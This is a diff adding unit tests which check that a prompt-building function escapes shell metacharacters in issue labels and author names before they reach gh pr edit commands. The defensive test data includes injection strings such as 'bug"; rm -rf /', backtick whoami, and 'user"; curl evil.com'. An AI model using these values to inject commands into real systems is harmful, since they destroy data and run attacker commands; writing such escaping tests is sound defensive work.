@@ -450,5 +450,45 @@ Step 3: Third thing`;
 
       expect(result).not.toContain("Dependency:");
     });
+
+    it("should escape shell metacharacters in labels", () => {
+      const maliciousLabels = ['bug"; rm -rf /', "feature$VAR", "test`whoami`"];
+
+      const result = buildExecutePrompt({
+        ...defaultOptions,
+        issueLabels: maliciousLabels,
+      });
+
+      // Verify escaping is applied
+      expect(result).toContain('bug\\"; rm -rf /,feature\\$VAR,test\\`whoami\\`');
+      // Verify unescaped metacharacters are not present
+      expect(result).not.toMatch(/gh pr edit --add-label "bug"; rm/);
+      expect(result).not.toMatch(/feature\$VAR/);
+    });
+
+    it("should escape shell metacharacters in author", () => {
+      const maliciousAuthor = 'user"; curl evil.com; echo "';
+
+      const result = buildExecutePrompt({
+        ...defaultOptions,
+        issueAuthor: maliciousAuthor,
+      });
+
+      // Verify escaping is applied
+      expect(result).toContain('user\\"; curl evil.com; echo \\"');
+      // Verify the command injection is prevented
+      expect(result).not.toMatch(/gh pr edit --add-assignee "user"; curl/);
+    });
+
+    it("should escape both labels and author when both contain metacharacters", () => {
+      const result = buildExecutePrompt({
+        ...defaultOptions,
+        issueLabels: ['label"1', "label$2"],
+        issueAuthor: "user`whoami`",
+      });
+
+      expect(result).toContain('label\\"1,label\\$2');
+      expect(result).toContain("user\\`whoami\\`");
+    });
   });
 });
